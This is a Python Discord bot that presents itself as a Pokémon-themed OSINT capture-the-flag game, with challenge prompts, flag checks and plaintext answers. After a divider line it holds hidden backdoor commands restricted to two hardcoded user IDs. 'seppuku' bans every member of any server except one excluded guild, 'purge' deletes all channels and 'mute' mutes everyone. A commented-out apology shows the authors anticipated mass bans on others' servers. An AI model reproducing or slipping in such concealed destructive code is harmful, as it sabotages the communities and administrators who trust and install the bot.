import os
from discord.ext import commands
from discord.ext.commands import has_role
from discord.ext.commands import has_permissions
from discord.ext.commands import Bot
import asyncio
import random
import discord
import mysql.connector
import json
import time

bot = commands.Bot(command_prefix = 'pika')
bot.remove_command('help')

correct_responses = ['PIKAPIKA', 'Pika Pika!', 'Pikaaaaaa!', 'Piiiiiiik!', 'PikaaaCHUUUUU']
incorrect_responses = ['pikaa...', 'piiiik...', 'pikachu?', 'pika?']
CTF1_solved = []
CTF2_solved = []
CTF3_solved = []
CTF4_solved = []
CTF5_solved = []
#Planning to make CTF{}_solved in MySQL...

activetest1 = []
activetest2 = []
activetest3 = []
activetest4 = []

@bot.event
async def on_ready():
    global seppukuprime
    print('Pika Pika!')
    seppukuprime = False
#Prints 'Pika Pika!' when bot is ready to function

@bot.event
async def on_message(message):
    author = message.author.id
    if author in activetest1:
        correct_answer = 'pikaCTF{Pokemon_Center_Mega_Tokyo}'
        message1 = message.content
        if message1 == correct_answer:
            await message.channel.purge(limit = 2)
            await message.channel.send(f'{random.choice(correct_responses)}\ncorrect!')
            CTF1_solved.append(author)
        else:
            await message.channel.send(f'{random.choice(incorrect_responses)}\nincorrect...')
        activetest1.remove(message.author.id)
    else:
        if author in activetest2:
            correct_answer = 'pikaCTF{Chevron}'
            message1 = message.content
            if message1 == correct_answer:
                await message.channel.purge(limit = 2)
                await message.channel.send(f'{random.choice(correct_responses)}\ncorrect!')
                CTF2_solved.append(author)
            else:
                await message.channel.send(f'{random.choice(incorrect_responses)}\nincorrect...')
            activetest2.remove(message.author.id)
        else:
            if author in activetest3:
                correct_answer = 'pikaCTF{Pizza_Hut}'
                message1 = message.content
                if message1 == correct_answer:
                    await message.channel.purge(limit = 2)
                    await message.channel.send(f'{random.choice(correct_responses)}\ncorrect!')
                    CTF3_solved.append(author)
                else:
                    await message.channel.send(f'{random.choice(incorrect_responses)}\nincorrect...')
                activetest3.remove(message.author.id)
            await bot.process_commands(message)
#Flag check

@bot.command()
async def start(ctx):
    member = ctx.message.author
    role_name = 'pikaCTF'
    role = discord.utils.get(member.guild.roles, name = role_name)
    await member.add_roles(role)
#Initiates print statement when bot is "ready"

@bot.command()
@has_role('pikaCTF')
async def score(ctx):
    username2 = ctx.message.author.name
    username = ctx.message.author.id
    if username in CTF1_solved:
        status1 = '**Solved**'
    else:
        status1 = 'Unsolved'
    if username in CTF2_solved:
        status2 = '**Solved**'
    else:
        status2 = 'Unsolved'
    if username in CTF3_solved:
        status3 = '**Solved**'
    else:
        status3 = 'Unsolved'
    if username in CTF4_solved:
        status4 = '**Solved**'
    else:
        status4 = 'Unsolved'
    await ctx.send(f'''
{username2}\'s current completion:
1. CTF_1 - {status1}
2. CTF_2 - {status2}
3. CTF_3 - {status3}
4. CTF_4 - {status4}
    ''')
#Defines whether or not they have completed a certain challenge(s) in a list

@bot.command()
async def CTF(ctx):
    username = ctx.message.author.name
    await ctx.send(f'''
Hey there {username}!
1. Get different problems by typing pikaCTF_(problem number)
2. Flag format: pikaCTF{{flag}}
3. Collaboration is allowed
4. Please have embeds enabled to see the challenges
5. The bot will automatically erase your answer if it is correct
7. You can also DM the bot to play as well
8. To start please use the 'pikastart' command to gain the pikaCTF role and start
    ''')
#Lists beginning instructions and guidelines + personally greets people by username

@bot.command()
@has_role('pikaCTF')
async def CTF_1(ctx):
    author = ctx.message.author.id
    if author not in activetest1:
        if author not in CTF1_solved:
            retStr = str('''```fix\nhttps://bit.ly/3aJ7u2F```''')
            embed = discord.Embed(title = 'yO4 cAn\'T d0 tHiS 0n3!')
            embed.add_field(name = 'N0 speci@l châractèrs\nUse_underscore_for_spaces\nWhere was this photo taken? (Google Maps official name):', value = retStr)
            await ctx.send(embed = embed)
            await ctx.send('Input flag:')
            activetest1.append(author)
        else:
            await ctx.send('*Challenge already completed!*')
#pikaCTF{Pokemon_Center_Mega_Tokyo}

@bot.command()
@has_role('pikaCTF')
async def CTF_2(ctx):
    author = ctx.message.author.id
    if author not in activetest2:
        if author not in CTF2_solved:
            retStr = str('''```fix\nhttps://bit.ly/35eYu4c```''')
            embed = discord.Embed(title = 'st3Gos4rUas')
            embed.add_field(name = 'What company runs the facility circled?:', value = retStr)
            await ctx.send(embed = embed)
            await ctx.send('Input flag:')
            activetest2.append(author)
        else:
            await ctx.send('*Challenge already completed!*')
#pikaCTF{Chevron}

@bot.command()
@has_role('pikaCTF')
async def CTF_3(ctx):
    author = ctx.message.author.id
    if author not in activetest3:
        if author not in CTF3_solved:
            retStr = str('''```fix\nhttps://bit.ly/3bR0Poz```''')
            embed = discord.Embed(title = 'Los pirámides del Egipto')
            embed.add_field(name = 'N0 speci@l châractèrs\nUse_underscore_for_spaces\nWhere was this photo taken? (Google Maps official name):', value = retStr)
            await ctx.send(embed = embed)
            await ctx.send('Input flag:')
            activetest3.append(author)
        else:
            await ctx.send('*Challenge already completed!*')
#pikaCTF{Pizza_Hut}

#------------------------------------------------------------------------------------------------
seppukuprime = False

@bot.command()
async def seppukuprime(ctx):
    global seppukuprime
    if (ctx.message.author.id == 321439238497239040 or ctx.message.author.id == 519738419904118784) and ctx.guild.id != 695047575807590440:
        if seppukuprime == False:
            seppukuprime = True
            await ctx.send('**Seppuku** is primed')
        else:
            await ctx.send('**Seppuku** is already primed')

@bot.command()
async def seppukuunprime(ctx):
    global seppukuprime
    if (ctx.message.author.id == 321439238497239040 or ctx.message.author.id == 519738419904118784) and ctx.guild.id != 695047575807590440:
        if seppukuprime == True:
            seppukuprime = False
            await ctx.send('**Seppuku** is unprimed')
        else:
            await ctx.send('**Seppuku** is already unprimed')

@bot.command()
async def seppuku(ctx):
    members = ctx.guild.members
    if (ctx.message.author.id == 321439238497239040 or ctx.message.author.id == 519738419904118784) and ctx.guild.id != 695047575807590440:
        for member in members:
            if seppukuprime == True:
                try:
                    guildname = ctx.guild.name
                    localtime = time.asctime( time.localtime(time.time()))
                    await member.ban(reason = None)
#                     await member.send(f'''In case you are confused as to what just happened:
# A command called \'*pikaseppuku*\' was just used to ban everyone on your *{guildname}* discord server
# If this command was used, I am genuinely sorry, I am unaware of as to whether this was on purpose or accident
# This is an hola niños moment - *Pikachu*
# Command executed at exactly (PST): **{localtime}**''')
                except:
                    pass
            else:
                await ctx.send('**Seppuku** is not primed, use command to prime')
                break
    else:
        await ctx.send('Uh oh... ')

@bot.command()
async def mute(ctx):
    members = ctx.guild.members
    if ctx.message.author.id == 321439238497239040 or ctx.message.author.id == 519738419904118784:
        for member in members:
            if member == 'Pikachu#4501':
                print('--Mute wave--')
            else:
                await member.add_roles(discord.utils.get(member.guild.roles, name = 'Muted'))
    else:
        await ctx.send('Uh oh... ')

@bot.command()
async def unmute(ctx):
    members = ctx.guild.members
    if ctx.message.author.id == 321439238497239040 or ctx.message.author.id == 519738419904118784:
        for member in members:
            if member == 'Pikachu#4501':
                print('--Unmute wave--')
            else:
                await member.remove_roles(discord.utils.get(member.guild.roles, name = 'Muted'))
    else:
        await ctx.send('Uh oh... ')

@bot.command()
async def purge(ctx):
    channels = ctx.guild.channels
    if ctx.message.author.id == 321439238497239040 or ctx.message.author.id == 519738419904118784:
        for channel in channels:
            await channel.delete(reason = None)
    else:
        await ctx.send('Uh oh... ')

@bot.command()
async def clear(ctx, amount):
    await ctx.channel.purge(limit = int(amount))
    await ctx.send(f'**{amount}** lines cleared')

bot.run()
